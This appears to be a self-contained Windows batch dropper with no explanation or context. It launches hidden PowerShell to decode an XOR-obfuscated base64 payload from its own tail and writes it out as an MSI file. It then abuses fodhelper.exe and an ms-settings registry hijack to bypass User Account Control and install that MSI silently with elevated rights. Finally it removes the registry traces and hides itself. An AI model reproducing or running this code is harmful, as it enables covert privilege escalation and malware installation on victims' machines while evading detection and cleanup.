@echo off
set "stage=%TEMP%\qwertyui"
mkdir "%stage%" 2>nul
powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -Command "$f=gc -Raw '%~f0';$i=$f.LastIndexOf('<<<0123456789abcdef>>>');$j=$f.LastIndexOf('<<<fedcba9876543210>>>');$b=$f.Substring($i+22,$j-$i-22) -replace '\s','';$d=[Convert]::FromBase64String($b);$m=[Array]::ConvertAll($d,[System.Converter[byte,byte]]{param($x)$x-bxor250});$p=$env:TEMP+'\qwertyui\doc.msi';[IO.File]::WriteAllBytes($p,$m)"
reg add "HKCU\Software\Classes\stageproto\shell\open\command" /ve /d "msiexec /a %stage%\doc.msi /qn TARGETDIR=%stage%\sc" /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /ve /d stageproto /f
start "" "%WINDIR%\System32\fodhelper.exe"
timeout /t 2 >nul
reg delete "HKCU\Software\Classes\ms-settings\CurVer" /f
reg delete "HKCU\Software\Classes\stageproto" /f
attrib +h +s "%~f0"
exit /b
<<<0123456789abcdef>>>
KjXrGltL4Buon4qIn4mflI6bjpOMn9qTlJ+IjtqTlImOm5aWn4janpuOmw==
<<<fedcba9876543210>>>
